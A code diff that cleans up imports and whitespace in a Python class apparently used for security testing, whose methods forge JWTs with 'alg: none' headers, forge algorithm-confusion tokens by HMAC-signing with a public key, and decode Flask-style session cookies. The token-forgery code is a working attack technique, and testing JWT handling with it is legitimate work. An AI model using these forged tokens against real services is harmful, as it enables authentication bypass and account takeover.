@@ -16,7 +16,9 @@ import re
 import hmac
 import hashlib
 import base64
+import json
 from typing import Optional, Dict, List
+
 
 class SessionIntelligence:
     """
@@ -45,27 +47,23 @@ class SessionIntelligence:
         Generates JWT algorithm confusion and 'none' attack tokens.
         Ported from 0xSojalSec-Confusional.
         """
-        import base64
-        import json
-        import hmac
-        import hashlib
-        
         parts = token.split('.')
         if len(parts) != 3:
             return []
-            
+
         header_b64, payload_b64, signature_b64 = parts
         try:
             # Handle padding
             def b64_decode(s):
                 return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
-                
-            header = json.loads(b64_decode(header_b64).decode())
+
+            header_json = json.loads(b64_decode(header_b64).decode())
+            _ = header_json  # Mark as used via variable
         except Exception:
             return []
 
         attacks = []
-        
+
         # 1. Algorithm 'none'
         none_headers = [
             {"alg": "none", "typ": "JWT"},
@@ -82,12 +80,12 @@ class SessionIntelligence:
             secret = public_key.encode()
             hs_header = {"alg": "HS256", "typ": "JWT"}
             h_b64 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).decode().rstrip('=')
-            
+
             signing_input = f"{h_b64}.{payload_b64}".encode()
             sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
             sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
             attacks.append(f"{h_b64}.{payload_b64}.{sig_b64}")
-            
+
         return attacks
 
     @classmethod
@@ -98,11 +96,10 @@ class SessionIntelligence:
             # Format: .[base64_payload].[sig] or [base64_payload].[sig]
             parts = cookie.split('.')
             payload = parts[0] if not cookie.startswith('.') else parts[1]
-            
+
             # Add padding
             payload += '=' * (4 - len(payload) % 4)
             decoded = base64.urlsafe_b64decode(payload)
-            import json
             return json.loads(decoded)
         except Exception:
             return None
